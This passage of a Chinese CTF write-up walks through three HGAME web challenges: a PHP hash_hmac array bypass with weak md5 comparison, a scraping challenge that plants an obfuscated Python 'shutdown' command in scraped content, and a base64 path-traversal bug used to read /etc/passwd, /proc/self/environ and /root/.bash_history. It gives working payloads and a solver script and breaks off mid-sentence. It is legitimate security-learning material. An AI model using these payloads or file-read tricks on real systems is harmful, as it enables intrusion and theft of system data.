language"></a>php is the best language</h3><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'secret.php'</span>;</span><br><span class="line"><span class="comment">#echo $flag;</span></span><br><span class="line"><span class="comment">#echo $secret;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'gate'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);  <span class="comment">//传door[]置空secret</span></span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);         <span class="comment">//gate即可解出</span></span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以发现关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);  <span class="comment">//传door[]置空secret</span></span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);         <span class="comment">//gate即可解出</span></span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p><code>hash_hmac ( string $algo , string $data , string $key)</code>函数的data部分如果传入的为数组，则会返回<code>NULL</code>，所以即可将<code>$door</code>参数传入数组，即可得到可控的<code>$gate</code>，所以就直接可以绕过第二个if判断；</p></li><li><p>经过两次<code>md5</code>函数以后进行弱判断(==)，可以直接爆破：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($x=<span class="number">1</span>;$x&lt;<span class="number">100000000</span>;$x++)&#123;</span><br><span class="line"><span class="keyword">if</span> ((md5($x)+<span class="number">1</span>) == (md5(md5($x)))+<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $x;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="number">12</span>[Finished in <span class="number">0.2</span>s]</span><br></pre></td></tr></table></figure></li><li><p>直接GET一个<code>$door</code>传一个数组，<code>$key=12</code>，可控的<code>$gate</code>为<code>key</code>的<code>sha256</code>值；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sec=<span class="keyword">NULL</span>;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>,<span class="string">'12'</span>,$sec);</span><br><span class="line"><span class="keyword">echo</span> $gate;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">4217722</span>a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf[Finished in <span class="number">0.2</span>s]</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?door[]=1&amp;key=12&amp;gate=4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf</span><br></pre></td></tr></table></figure></li></ol><h3 id="BabySpider"><a href="#BabySpider" class="headerlink" title="BabySpider"></a>BabySpider</h3><p>这题考察python爬虫的编写能力，python渣渣写过点爬虫，正好拿来实战一下，不得不说这个题出的确实是好，也让我了解到了许多反爬的机制，下面就详细讲解一下做题的艰辛过程：</p><h4 id="1-10关"><a href="#1-10关" class="headerlink" title="1-10关"></a>1-10关</h4><p>其实就是简单的爬取页面，进行信息筛选，执行一下post回去即可，我当然会想的这么简单；</p><h4 id="11-20关"><a href="#11-20关" class="headerlink" title="11-20关"></a>11-20关</h4><p>然后就关机了…</p><p>一开始我以为是pycharm的锅，没想到第二次运行还是关机…瞬间爆炸（surprise mother f**ker）肯定是出题人调皮了…真的是秀（这反爬虫机制是真的骚~）</p><p>果然爬完第十关以后直接爬出11关的内容就要break观察一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> __g: [(os.system(<span class="string">'shutdown -s -t 0'</span>), (os.system(<span class="string">'shutdown now'</span>), <span class="keyword">None</span>)[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">'os'</span>] <span class="keyword">in</span> [(__import__(<span class="string">'os'</span>, __g, __g))]][<span class="number">0</span>])(globals())<span class="comment">#-----=?</span></span><br></pre></td></tr></table></figure><p>大概是调用了一个os模块直接给我调用系统命令直接<code>shutdown</code>了，直接<code>eval()</code>肯定会关机；解决方法就是在http请求内容里加上UA头即可解决关机的困扰…</p><p>如果你认为这就结束了那就太天真了…加上以后继续报错…</p><p>不知道该肿么办啦…只好去看看官方wp，了解到了另一种反爬虫机制，具体解析如下：</p><p>打印好第11关的cookie，首先拿token登录，将页面的cookie修改为第11关的cookie，刷新页面：</p><p><a href="https://imgchr.com/i/k7yYhn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/k7yYhn.md.png" alt="k7yYhn.md.png"></a></p><p>发现网页显示的数字和要爬取的信息不一致（算式和之前的都不一样，答案还对个锤子？）：</p><p><img src="https://s2.ax1x.com/2019/02/28/k7y6hR.png" alt="k7y6hR.png"></p><p><img src="https://s2.ax1x.com/2019/02/28/k7yWjK.png" alt="k7yWjK.png"></p><p>继续在页面里搜索，发现style.css中的内容，原来是存在一个<code>Ariali.otf</code>文件：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">font-face</span> &#123;</span><br><span class="line">      <span class="attribute">font-family</span>: Ariali;</span><br><span class="line">      <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">'/static/Ariali.otf'</span>);</span><br><span class="line">      <span class="attribute">font-weight</span>: normal;</span><br><span class="line">      <span class="attribute">font-style</span>: normal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看文件内容：</p><p><img src="https://s2.ax1x.com/2019/02/28/k7j3bF.png" alt="k7j3bF.png"></p><p>字体文件被动了手脚，数字的对应关系被打乱了，那么找到对应关系，将之前的公式恢复出来执行即可得到正确的答案；原来数字和替换后数字的对应关系如下，写个字典或者列表替换一下即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 2 3 4 5 6 7 8 9 0</span><br><span class="line">| | | | | | | | | |</span><br><span class="line">0 2 6 9 4 3 5 8 7 1</span><br></pre></td></tr></table></figure><h4 id="21-30关"><a href="#21-30关" class="headerlink" title="21-30关"></a>21-30关</h4><p>到21关时候又报错了…打个CTF真辛苦啊…</p><p><img src="https://s2.ax1x.com/2019/02/28/kHAkr9.png" alt="kHAkr9.png"></p><p>再次使用第20关的cookie替换，查看到爬取到的表达式和页面上的又不一样…而且还不满足11-20关的替换关系，</p><p><a href="https://imgchr.com/i/kHApCT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHApCT.md.png" alt="kHApCT.md.png"></a></p><p>再次查看源码，在css中的after元素中找到了真的表达式：</p><p><a href="https://imgchr.com/i/kHAe56" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHAe56.md.png" alt="kHAe56.md.png"></a></p><p>手速比较快的话，还是可以看到的（和上面的cookie不一样，所以表达式不一样）：</p><p><a href="https://imgchr.com/i/kHATd1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHATd1.md.png" alt="kHATd1.md.png"></a></p><p>所以只要抓取css样式里的表达式即可：</p><p>解题脚本(python3)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">"http://111.231.140.29:10000/"</span></span><br><span class="line">url1=<span class="string">"http://111.231.140.29:10000/question"</span></span><br><span class="line">url2=<span class="string">"http://111.231.140.29:10000/solution"</span></span><br><span class="line">url3=<span class="string">"http://111.231.140.29:10000/statics/style.css"</span></span><br><span class="line">head=&#123;<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0"</span>&#125;</span><br><span class="line">token=&#123;<span class="string">"token"</span>:<span class="string">"phatlrSLFTDHSXiuD0wbG9DczhKcXRCm"</span>&#125;</span><br><span class="line">str1=[<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>]</span><br><span class="line">str2=[<span class="string">'0'</span>,<span class="string">'2'</span>,<span class="string">'6'</span>,<span class="string">'9'</span>,<span class="string">'4'</span>,<span class="string">'3'</span>,<span class="string">'5'</span>,<span class="string">'8'</span>,<span class="string">'7'</span>,<span class="string">'1'</span>]</span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=token)</span><br><span class="line">r.encoding=r.apparent_encoding</span><br><span class="line">session=r.cookies</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">10</span>:</span><br><span class="line">        print(<span class="string">"*"</span>*<span class="number">20</span>+str(i+<span class="number">1</span>)+<span class="string">"*"</span>*<span class="number">20</span>)</span><br><span class="line">        num=re.findall(<span class="string">r'&lt;span&gt;(.*?)&lt;/span&gt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        res=eval(num[<span class="number">0</span>:<span class="number">-2</span>])</span><br><span class="line">        print(num+<span class="string">"  "</span>+str(res))</span><br><span class="line">        answer=&#123;<span class="string">"answer"</span>:res&#125;</span><br><span class="line">        r=requests.post(url2,data=answer,cookies=session,headers=head)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        session=r.cookies</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> i&gt;<span class="number">9</span> <span class="keyword">and</span> i&lt;<span class="number">20</span>:</span><br><span class="line">        print(<span class="string">"*"</span> * <span class="number">20</span> + str(i + <span class="number">1</span>) + <span class="string">"*"</span> * <span class="number">20</span>)</span><br><span class="line">        num = re.findall(<span class="string">r'&lt;span&gt;(.*?)&lt;/span&gt;'</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">        num1=<span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">                subscript = str1.index(i)</span><br><span class="line">                num1 += str2[subscript]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num1 += i</span><br><span class="line">        res = eval(num1[<span class="number">0</span>:<span class="number">-2</span>])</span><br><span class="line">        print(num1 + <span class="string">"  "</span> + str(res))</span><br><span class="line">        answer = &#123;<span class="string">"answer"</span>: res&#125;</span><br><span class="line">        r = requests.post(url2, data=answer, cookies=session, headers=head)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        session = r.cookies</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> i&gt;<span class="number">19</span>:</span><br><span class="line">        print(<span class="string">"*"</span>*<span class="number">20</span>+str(i+<span class="number">1</span>)+<span class="string">"*"</span>*<span class="number">20</span>)</span><br><span class="line">        response=requests.get(url3,cookies=session,headers=head)</span><br><span class="line">        response.encoding=response.apparent_encoding</span><br><span class="line">        num=re.findall(<span class="string">r'content:"(.*?)='</span>,response.text)[<span class="number">0</span>]</span><br><span class="line">        res=eval(num)</span><br><span class="line">        print(num+<span class="string">"  "</span>+str(res))</span><br><span class="line">        answer=&#123;<span class="string">"answer"</span>:res&#125;</span><br><span class="line">        r=requests.post(url2,data=answer,cookies=session,headers=head)</span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        session=r.cookies</span><br><span class="line"><span class="keyword">if</span> <span class="string">"hgame"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(r.text)</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><a href="https://imgchr.com/i/kHVkA1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHVkA1.md.png" alt="kHVkA1.md.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;9242455136c7afcc0d75204281e558ab63ac9a841e514a37e6702f15f21f3e01&#125;</span><br></pre></td></tr></table></figure><p><strong>这题出的真的是好，花了很长时间才解出来，归纳一下：</strong></p><ol><li><p><strong>还是不要只刷CTF题忘记原理的理解，类似于UA头，referer，此类的反爬虫措施还是很常见的，还有就是实际爬虫不注意说不定会被反日…</strong></p></li><li><p><strong>两个trick分别是对应了猫眼电影和汽车之家的前端反爬机制，利用视觉差异来欺骗爬虫而不影响正常的用户，如果不加注意，那么爬到的数据有可能就是一堆毫无作用的数据；</strong></p></li></ol><h3 id="Math有趣"><a href="#Math有趣" class="headerlink" title="Math有趣"></a>Math有趣</h3><p>通过第一关以后发现第二关的题目是一张图片，查看图片地址发现地址为：<code>cXVlc3Rpb24ucG5n.php</code>，base64解码以后发现为<code>question.png</code>，想到任意文件读取漏洞，尝试<code>../../../../../etc/passwd.php</code>（base64以后），发现可以成功读取：</p><p><a href="https://imgchr.com/i/kH53Xd" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kH53Xd.md.png" alt="kH53Xd.md.png"></a></p><p><strong><em>hint：了解一下tomcat、spring mvc的目录结构和配置文件(自己搭一下就明白了</em></strong></p><p><strong>solution1：</strong>既然可以读取，于是尝试<code>../../../../../proc/self/environ</code>，成功读取，下载下来16进制转码得到有用的路径：</p><p><a href="https://imgchr.com/i/kHIVgg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kHIVgg.md.png" alt="kHIVgg.md.png"></a></p><p><strong>solution2：</strong>还有一种方法就是读取<code>/root/.bash_history</code>查看命令历史：</p><p>进入tomcat：</p><p><img src="https://s2.ax1x.com/2019/03/01/kHIzGT.png" alt="kHIzGT.png"></p><p>工作目录：</p><p><img src="https://s2.ax1x.com/2019/03/01/kHIOZn.png" alt="kHIOZn.png"></p><p>到现在为止定位到：<code>usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller</code></p><p>试一下随便读取<code>1.php</code>，发现报错，发现了关键信息:</p><p><a href="https://imgchr.com/i/kHo1eA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kHo1eA.md.png" alt="kHo1eA.md.png"></a></p><p>所以读取路径最后为：<code>../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class</code></p><p><strong>payload:</strong><code>http://test.tan90.me:8080/img/Li4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL3RvbWNhdC93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2hnYW1lL2NvbnRyb2xsZXIvTWF0aENvbnRyb2xsZXIuY2xhc3M=</code></p><p>读取到改为后缀为class文件以后，进行反编译为java文件，得到源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hgame.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.ModelMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@org</span>.springframework.stereotype.Controller</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MathController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">MathController</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/index"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(ModelMap model, HttpSession session, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Object step = session.getAttribute(<span class="string">"step"</span>);</span><br><span class="line">    <span class="keyword">if</span> (step == <span class="keyword">null</span>) &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, Character.valueOf(<span class="string">'1'</span>));</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (step.toString().equals(<span class="string">"1"</span>)) &#123;</span><br><span class="line">      model.addAttribute(<span class="string">"message"</span>, <span class="string">"Welcome to the world of mathematics.&lt;br/&gt;Let's warm up first.&lt;br/&gt;1+1=?"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (step.toString().equals(<span class="string">"2"</span>)) &#123;</span><br><span class="line">      model.addAttribute(<span class="string">"message"</span>, <span class="string">"It seems that you have learned it, let us do a difficult question.&lt;br/&gt;&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt;&lt;br/&gt;Show me the smallest integer solutions."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"math"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/index"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pindex</span><span class="params">(@org.springframework.web.bind.annotation.RequestParam(<span class="string">"answer"</span>)</span> String answer, HttpSession session, HttpServletResponse response) <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Object step = session.getAttribute(<span class="string">"step"</span>);</span><br><span class="line">    <span class="keyword">if</span> (step == <span class="keyword">null</span>) &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, Character.valueOf(<span class="string">'1'</span>));</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((step.toString().equals(<span class="string">"1"</span>)) &amp;&amp; </span><br><span class="line">      (answer.equals(<span class="string">"2"</span>))) &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, <span class="string">"2"</span>);</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/img/&#123;path&#125;"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">image</span><span class="params">(@org.springframework.web.bind.annotation.PathVariable(<span class="string">"path"</span>)</span> String path, HttpServletResponse response)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    path = <span class="keyword">new</span> String(java.util.Base64.getDecoder().decode(path));</span><br><span class="line">    InputStream f = <span class="keyword">null</span>;</span><br><span class="line">    OutputStream out = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      f = <span class="keyword">new</span> java.io.FileInputStream(<span class="string">"/home/static/"</span> + path);</span><br><span class="line">      out = response.getOutputStream();</span><br><span class="line">      <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="string">' '</span>];</span><br><span class="line">      <span class="keyword">while</span> ((count = f.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        out.write(buffer, <span class="number">0</span>, count);</span><br><span class="line">        out.flush();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      f.close();</span><br><span class="line">      out.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"ok"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/flag"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现关键函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>123852^x % 612799081 = 6181254136845 % 612799081</code>， 